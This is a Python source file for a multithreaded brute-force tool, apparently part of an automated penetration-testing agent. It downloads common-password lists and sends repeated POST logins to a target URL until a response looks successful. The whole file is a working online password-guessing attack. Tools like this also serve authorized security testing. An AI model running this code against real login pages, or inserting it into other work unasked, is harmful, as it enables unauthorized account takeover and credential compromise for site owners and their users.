import requests
from colorama import Fore
import os
import concurrent.futures

class BruteForcer:
    def __init__(self):
        self.wordlists = {
            "top1000": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt",
            "top10000": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt",
            "phpbb": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/phpbb.txt"
        }
        self.wordlist_dir = "wordlists"
        if not os.path.exists(self.wordlist_dir):
            os.makedirs(self.wordlist_dir)

    def download_wordlist(self, name="top1000"):
        url = self.wordlists.get(name, self.wordlists["top1000"])
        filename = os.path.join(self.wordlist_dir, f"{name}.txt")
        
        if not os.path.exists(filename):
            print(f"{Fore.CYAN}[*] Downloading wordlist ({name}) from {url}...")
            try:
                r = requests.get(url, stream=True, timeout=20)
                if r.status_code == 200:
                    with open(filename, 'wb') as f:
                        for chunk in r.iter_content(chunk_size=8192):
                            f.write(chunk)
                    print(f"{Fore.GREEN}[+] Download complete: {filename}")
                else:
                    print(f"{Fore.RED}[!] Failed to download wordlist. Using fallback internal list.")
                    # Return path to a dummy fallback if download fails (omitted for brevity)
            except Exception as e:
                print(f"{Fore.RED}[!] Error downloading wordlist: {e}")
        
        return filename

    def run(self, target_url, username, wordlist_name="top1000", threads=5):
        print(f"{Fore.CYAN}[*] Starting Brute Force on {target_url} (User: {username}) using {wordlist_name}...")
        
        wordlist_path = self.download_wordlist(wordlist_name)
        if not os.path.exists(wordlist_path):
             print(f"{Fore.RED}[Error] Wordlist not found.")
             return None

        found_password = None
        
        # Load passwords
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]

        def try_login(password):
            nonlocal found_password
            if found_password: return # Stop if found
            
            # Simple form data guess (field names guessed or hardcoded for now - should be dynamic)
            # In real integration, we'd pass field names 'user_field', 'pass_field'
            data = {
                "username": username, # Simplification: Agent needs to map this
                "password": password,
                "uname": username,
                "pass": password,
                "user": username,
                "pwd": password
            }
            # We explicitly send 'uname'/'pass' too because testphp uses those
            
            try:
                # Assuming POST
                res = requests.post(target_url, data=data, timeout=5)
                
                # Check Success (Using same logic as Defaults/SQLi)
                if self.is_success(res):
                    found_password = password
                    print(f"{Fore.GREEN}[!!!] PASSWORD FOUND: {password}")
                    return password
            except:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            # Submit all tasks
            futures = [executor.submit(try_login, pwd) for pwd in passwords]
            
            # Monitoring loop?
            for future in concurrent.futures.as_completed(futures):
                if found_password:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
        
        if found_password:
            return found_password
        else:
            print(f"{Fore.YELLOW}[-] Brute force finished. Password not found in wordlist.")
            return None

    def is_success(self, res):
        if res.status_code != 200: return False
        text = res.text.lower()
        if "invalid" in text or "incorrect" in text or "fail" in text:
            return False
        if "welcome" in text or "logout" in text or "dashboard" in text:
            return True
        return False
